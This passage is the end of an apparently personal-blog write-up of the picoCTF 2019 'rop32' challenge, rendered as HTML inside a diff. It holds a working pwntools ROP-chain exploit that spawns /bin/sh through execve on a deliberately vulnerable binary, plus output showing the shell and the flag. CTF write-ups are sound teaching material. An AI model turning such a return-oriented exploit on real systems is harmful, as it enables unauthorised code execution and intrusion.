+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_EDX_TO_EAX</span><span class="p">)</span>
+    <span class="c1"># put //sh in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;//sh&#34;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+
+    <span class="c1">## write null byte at the end of /bin//sh</span>
+    <span class="c1"># put the address of the .data section + 8 (so after /bin//sh) in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_EDX_TO_EAX</span><span class="p">)</span>
+    <span class="c1"># set edx to 0</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x080564d5</span><span class="p">)</span> <span class="c1"># mov edx, 0xffffffff; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0805e095</span><span class="p">)</span> <span class="c1"># inc edx; ret;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+
+
+    <span class="c1">#####  step 2: fill the arguments for sys_execve</span>
+    <span class="c1"># put 11 in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_EDX_TO_EAX</span><span class="p">)</span>
+    <span class="c1"># put the address of .data in ebx, where /bin//sh is</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0806ee92</span><span class="p">)</span> <span class="c1"># pop ecx; pop ebx; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># put 0 in ecx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span><span class="p">)</span> <span class="c1"># put .data in ebx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span> <span class="c1"># put 0 in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span>
+
+    <span class="c1">#####  step 3: make a syscall</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">INT_80</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">IS_REMOTE</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="k">if</span> <span class="n">IS_REMOTE</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;2019shell1.picoctf.com&#34;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">&#34;kylma&#34;</span><span class="p">,</span> <span class="n">ssh_agent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">connected</span><span class="p">():</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;vuln&#39;</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="s2">&#34;/problems/rop32_0_b4142d4df31cb73e170c77dac234a79a&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;vuln&#34;</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>For some reason, running locally doesn&rsquo;t exactly work well:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">process 67027 is executing new program: /usr/bin/bash
+warning: Could not load shared library symbols for linux-vdso.so.1.
+Do you need &#34;set solib-search-path&#34; or &#34;set sysroot&#34;?
+</code></pre></div><p>But it runs fine on the server <code>¯\_(ツ)_/¯</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./solve.py NOPTRACE
+b&#39;ZZZZZZZZZZZZZZZZZZZZZZZZZZZZk\xee\x06\x08`\xa0\r\x08\x84G\x06\x08k\xee\x06\x08/bin4\xd0\t\x08k\xee\x06\x08d\xa0\r\x08\x84G\x06\x08k\xee\x06\x08//sh4\xd0\t\x08k\xee\x06\x08h\xa0\r\x08\x84G\x06\x08\xd5d\x05\x08\x95\xe0\x05\x084\xd0\t\x08k\xee\x06\x08\x0b\x00\x00\x00\x84G\x06\x08\x92\xee\x06\x08\x00\x00\x00\x00`\xa0\r\x08k\xee\x06\x08\x00\x00\x00\x00\xa0\xf7\x06\x08&#39;
+[+] Connecting to 2019shell1.picoctf.com on port 22: Done
+[*] kylma@2019shell1.picoctf.com:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process b&#39;vuln&#39; on 2019shell1.picoctf.com: pid 44613
+b&#39;Can you ROP your way out of this one?\n&#39;
+[!] Skipping debug attach since context.noptrace==True
+[*] Switching to interactive mode
+$ $ ls
+flag.txt  vuln    vuln.c
+$ $ cat flag.txt
+picoCTF{rOp_t0_b1n_sH_01a585a7}$ $  
+
+</code></pre></div><p>Flag: <code>picoCTF{rOp_t0_b1n_sH_01a585a7}</code></p>
+<p><img src="cat_stuck.gif" alt="cat_stuck.gif"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#finding-gadgets">Finding Gadgets</a>
+          <ul>
+            <li><a href="#set-eax--0xb">Set EAX = 0xB</a></li>
+            <li><a href="#set-ebx--pointer-on-binsh">Set EBX = pointer on &ldquo;/bin/sh&rdquo;</a></li>
+            <li><a href="#set-ecx--0">Set ECX = 0</a></li>
+            <li><a href="#set-edx--0">Set EDX = 0</a></li>
+            <li><a href="#call-int-0x80">Call int 0x80</a></li>
+          </ul>
+        </li>
+        <li><a href="#assembling-everything">Assembling Everything</a>
+          <ul>
+            <li><a href="#finding-the-offset-of-the-first-gadget">Finding the Offset of the First Gadget</a></li>
+            <li><a href="#chaining-gadgets">Chaining Gadgets</a></li>
+          </ul>
+        </li>
+        <li><a href="#debugging-the-rop-chain">Debugging the ROP chain</a>
+          <ul>
+            <li><a href="#the-quest-for-a-new-pop-eax">The Quest For A New <code>pop eax</code></a></li>
+            <li><a href="#random-trick-to-debug-a-rop-chain">Random Trick to Debug a ROP chain</a></li>
+          </ul>
+        </li>
+        <li><a href="#what-about-the-flag-though">What About the Flag Though?</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
